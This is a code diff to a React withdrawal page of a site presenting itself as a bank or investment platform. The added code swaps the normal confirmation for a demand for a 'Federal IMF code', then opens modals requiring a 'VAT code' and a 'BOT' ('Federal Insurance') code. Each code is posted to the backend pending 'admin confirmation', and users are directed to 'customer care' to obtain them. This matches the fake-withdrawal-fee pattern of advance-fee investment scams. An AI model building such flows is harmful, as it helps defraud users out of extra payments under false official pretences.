@@ -37,6 +37,15 @@ const Withdraw = () => {
   const [success, setSuccess] = useState('')
   const [showReasonModal, setShowReasonModal] = useState(false)
   const [selectedReason, setSelectedReason] = useState('')
+  
+  // VAT and BOT code verification states
+  const [showVatModal, setShowVatModal] = useState(false)
+  const [showBotModal, setShowBotModal] = useState(false)
+  const [vatCode, setVatCode] = useState('')
+  const [botCode, setBotCode] = useState('')
+  const [currentWithdrawalId, setCurrentWithdrawalId] = useState(null)
+  const [vatSubmitting, setVatSubmitting] = useState(false)
+  const [botSubmitting, setBotSubmitting] = useState(false)
 
   const location = useLocation()
   const navigate = useNavigate()
@@ -232,7 +241,8 @@ const Withdraw = () => {
       const data = await response.json()
 
       if (response.ok) {
-        setSuccess('Withdrawal request submitted successfully! Processing time: 1-3 business days.')
+        setSuccess('The Federal IMF code is required for this transaction can be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the IMF code for this transaction.')
+        setCurrentWithdrawalId(data.withdrawalRequest?._id || data.id)
         setWithdrawAmount('')
         setBankDetails({ accountNumber: '', routingNumber: '', accountName: '' })
         // Reset payment details for the current method
@@ -255,6 +265,11 @@ const Withdraw = () => {
         }))
         // Refresh balance after successful withdrawal
         fetchBalance()
+        
+        // Show VAT modal after a short delay
+        setTimeout(() => {
+          setShowVatModal(true)
+        }, 3000)
       } else {
         setError(data.message || 'Withdrawal failed')
       }
@@ -283,6 +298,86 @@ const Withdraw = () => {
       case 'failed': return 'text-red-600 bg-red-100'
       case 'cancelled': return 'text-gray-600 bg-gray-100'
       default: return 'text-gray-600 bg-gray-100'
+    }
+  }
+
+  // VAT Code submission
+  const submitVatCode = async () => {
+    if (!vatCode.trim()) {
+      setError('Please enter the VAT code')
+      return
+    }
+
+    setVatSubmitting(true)
+    setError('')
+
+    try {
+      const response = await fetch(`${API_BASE}/payments/withdrawal/${currentWithdrawalId}/vat-code`, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${token}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ vatCode: vatCode.trim() })
+      })
+
+      const data = await response.json()
+
+      if (response.ok) {
+        setShowVatModal(false)
+        setVatCode('')
+        setSuccess('VAT code submitted successfully. Waiting for admin confirmation.')
+        // Refresh withdrawal history
+        if (activeTab === 'history') {
+          fetchWithdrawHistory()
+        }
+      } else {
+        setError(data.message || 'Failed to submit VAT code')
+      }
+    } catch (err) {
+      setError('Network error. Please try again.')
+    } finally {
+      setVatSubmitting(false)
+    }
+  }
+
+  // BOT Code submission
+  const submitBotCode = async () => {
+    if (!botCode.trim()) {
+      setError('Please enter the BOT code')
+      return
+    }
+
+    setBotSubmitting(true)
+    setError('')
+
+    try {
+      const response = await fetch(`${API_BASE}/payments/withdrawal/${currentWithdrawalId}/bot-code`, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${token}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ botCode: botCode.trim() })
+      })
+
+      const data = await response.json()
+
+      if (response.ok) {
+        setShowBotModal(false)
+        setBotCode('')
+        setSuccess('BOT code submitted successfully. Your withdrawal will be processed shortly.')
+        // Refresh withdrawal history
+        if (activeTab === 'history') {
+          fetchWithdrawHistory()
+        }
+      } else {
+        setError(data.message || 'Failed to submit BOT code')
+      }
+    } catch (err) {
+      setError('Network error. Please try again.')
+    } finally {
+      setBotSubmitting(false)
     }
   }
 
@@ -954,6 +1049,120 @@ const Withdraw = () => {
                 >
                   Close
                 </button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* VAT Code Modal */}
+        {showVatModal && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+            <div className="bg-white rounded-lg shadow-xl max-w-md w-full mx-4">
+              <div className="p-6">
+                <div className="flex items-center justify-center mb-4">
+                  <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center">
+                    <svg className="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m0 0v2m0-2h2m-2 0H10m2-8V7a2 2 0 00-2-2H8a2 2 0 00-2 2v2"></path>
+                    </svg>
+                  </div>
+                </div>
+                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">VAT Code is required.</h3>
+                <p className="text-sm text-gray-600 text-center mb-6">
+                  The VAT code is required for this transaction to be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the VAT code for this transaction.
+                </p>
+                
+                <div className="mb-4">
+                  <label className="block text-sm font-medium text-gray-700 mb-2">Enter VAT Code:</label>
+                  <input
+                    type="text"
+                    value={vatCode}
+                    onChange={(e) => setVatCode(e.target.value)}
+                    placeholder="••••••"
+                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                    maxLength="20"
+                  />
+                </div>
+                
+                <p className="text-xs text-gray-500 text-center mb-6">
+                  We have security measures in place to safeguard your money because we are committed to providing you with a secure banking experience.
+                </p>
+                
+                <div className="flex space-x-3">
+                  <button
+                    onClick={() => {
+                      setShowVatModal(false)
+                      setVatCode('')
+                    }}
+                    className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                    disabled={vatSubmitting}
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={submitVatCode}
+                    disabled={vatSubmitting || !vatCode.trim()}
+                    className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    {vatSubmitting ? 'Verifying...' : 'Verify'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* BOT Code Modal */}
+        {showBotModal && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+            <div className="bg-white rounded-lg shadow-xl max-w-md w-full mx-4">
+              <div className="p-6">
+                <div className="flex items-center justify-center mb-4">
+                  <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center">
+                    <svg className="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m0 0v2m0-2h2m-2 0H10m2-8V7a2 2 0 00-2-2H8a2 2 0 00-2 2v2"></path>
+                    </svg>
+                  </div>
+                </div>
+                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">BOT is Required.</h3>
+                <p className="text-sm text-gray-600 text-center mb-6">
+                  The Federal Insurance code is required for this transaction can be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the BOT code for this transaction.
+                </p>
+                
+                <div className="mb-4">
+                  <label className="block text-sm font-medium text-gray-700 mb-2">Enter BOT Code:</label>
+                  <input
+                    type="text"
+                    value={botCode}
+                    onChange={(e) => setBotCode(e.target.value)}
+                    placeholder="••••••••"
+                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                    maxLength="20"
+                  />
+                </div>
+                
+                <p className="text-xs text-gray-500 text-center mb-6">
+                  We have security measures in place to safeguard your money because we are committed to providing you with a secure banking experience.
+                </p>
+                
+                <div className="flex space-x-3">
+                  <button
+                    onClick={() => {
+                      setShowBotModal(false)
+                      setBotCode('')
+                    }}
+                    className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                    disabled={botSubmitting}
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={submitBotCode}
+                    disabled={botSubmitting || !botCode.trim()}
+                    className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    {botSubmitting ? 'Verifying...' : 'Verify'}
+                  </button>
+                </div>
               </div>
             </div>
           </div>
